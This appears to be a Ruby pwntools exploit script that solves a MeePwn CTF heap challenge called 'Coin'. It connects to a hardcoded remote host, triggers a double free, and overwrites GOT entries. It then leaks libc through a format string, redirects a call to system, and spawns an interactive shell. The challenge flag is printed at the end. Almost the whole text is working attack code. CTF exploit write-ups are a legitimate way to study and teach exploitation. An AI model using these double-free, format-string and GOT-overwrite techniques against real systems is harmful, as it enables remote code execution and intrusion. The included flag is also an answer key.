#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '128.199.188.193', 33371
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'Coin.patch'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug

def pt(cmd); z.gets('>>>'); z.puts cmd; end

def order(bs, np, price, vol, stop, take)
  pt(0); pt('PWN')
  pt(bs); pt(np)
  z.gets 'price'; z.puts price
  z.gets 'Volum:'; z.puts vol
  z.gets 'Stoploss:'; z.puts stop
  z.gets 'Takeprofit:'; z.puts take
end

def monkey_order
  order(1,1,1337,1,1337.6, 1336.4)
end

def check_exp
  pt 0
  z.gets 'Exp: '
  z.gets.to_i >= 6
end

WIN = 9
def all_closed?
  pt(6)
  Array.new(WIN) { z.gets ' -> '; z.gets(' ') == 'Closed ' }.all?
end

pt(1)
WIN.times { monkey_order }
loop { log.info('Waiting...'); sleep(2); break if all_closed? }
pt 7 # back
(log.error('Bad luck...'); exit 1) unless check_exp
log.info('Nice! Switching to real account')

pt(1); pt(4); pt(7) # GC on!

pt 3
sleep(3) # wait GC, trigger double free
z.puts 'n'

def dummy_order
  order(1,1,2000,1,2001,1999)
end

pt 1
7.times { dummy_order }

order(1,1,'1e-38', 0x604070,'1e-37','1e-40')
2.times { dummy_order }

order(1, 1,
      (elf.plt['__isoc99_scanf'] + 6).p64.unpack('D*')[0],
      1,
      100,
      (elf.plt['printf'] + 6).p64.unpack('D*')[0])
pt("%17$p\n|")
z.gets('0x')
libc_base = z.gets.to_i(16) - 0x211c1
log.dump { libc_base.hex }
z.puts '333'.ljust(7, "\x00") # To choose menu 3
z.puts '%8c'.ljust(7, "\x00") # To input index 8
system = libc_base + 0x47dc0
z.puts system.p64.unpack('D*')[0]
# context.log_level = :debug
z.puts 'sh'
z.interact

# MeePwnCTF{5m3lls_L1k3_T3en_5p|r1t}
